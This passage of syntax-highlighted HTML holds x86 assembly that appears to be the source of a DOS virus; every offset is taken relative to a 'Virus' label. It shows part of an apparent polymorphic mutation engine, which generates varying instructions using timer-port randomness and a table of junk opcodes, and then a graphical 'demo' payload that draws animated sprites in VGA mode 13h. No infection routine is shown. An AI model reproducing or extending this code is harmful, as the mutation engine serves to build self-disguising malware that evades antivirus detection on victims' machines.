        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Regs3</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000011b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Regs4</span><span class="sc0">

</span><span class="sc5">Regs1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Gen2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000011b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Gen2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000101b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Gen2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Gen2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">StoreC</span><span class="sc0">

</span><span class="sc5">Regs2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111000b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001000b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Gen2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Gen2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00101000b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Gen2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111000b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Gen2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">StoreC</span><span class="sc0">

</span><span class="sc5">Regs3</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">StoreC</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">StoreC</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Gen2</span><span class="sc0">

</span><span class="sc5">Regs4</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111000b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">StoreC</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00010000b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">StoreC</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Gen2</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">StoreC</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">D0</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01000000b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">D8</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">D16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000110b</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">D0</span><span class="sc0">

</span><span class="sc5">D16</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">D8</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">D0</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Opcodes</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">036h</span><span class="sc4">,</span><span class="sc2">03Eh</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc2">04Ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">092h</span><span class="sc4">,</span><span class="sc2">098h</span><span class="sc4">,</span><span class="sc2">099h</span><span class="sc4">,</span><span class="sc2">0CCh</span><span class="sc4">,</span><span class="sc2">0F5h</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">













</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;               ДЕМКА</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">ShowDemo</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0A000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc4">*</span><span class="sc2">185</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc4">*</span><span class="sc2">015</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Spr1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc4">*</span><span class="sc2">160</span><span class="sc0">

</span><span class="sc5">Loop11</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Cord</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">157</span><span class="sc0">
</span><span class="sc5">Loop12</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">Loop12</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">NoMove</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">GZero</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">47h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">GZero</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">GZero</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">GZero</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowSpr</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">GZero</span><span class="sc0">

</span><span class="sc5">NoMove</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Spr2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Loop13</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowSpr</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Loop13</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CordSize</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Loop11</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">ShowSpr</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">

</span><span class="sc5">Loop14</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">Loop15</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Loop15</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Loop14</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Spr1</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">39</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">27</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">08</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">06</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
